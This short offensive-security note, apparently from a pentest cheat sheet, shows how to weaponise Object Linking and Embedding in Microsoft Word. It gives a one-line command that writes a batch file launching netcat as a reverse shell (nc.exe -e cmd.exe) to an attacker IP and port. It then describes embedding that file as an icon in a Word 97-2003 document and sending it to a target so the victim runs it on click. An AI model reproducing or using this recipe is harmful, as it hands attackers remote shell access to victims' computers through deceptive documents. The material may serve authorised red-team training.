# Object Linking and Embedding

Create a file

```sh
echo START cmd.exe /c nc.exe 192.168.45.128 4444 -e cmd.exe > lauch.bat
```

Create a Word document and go to: 
`Insert -> Object -> Create from file`

Then select the `lauch.bat` file

Save it as a **`Word 97-2003 Document`** template

Send to the target, upon opening the document and clicking on the icon, the file will be executed
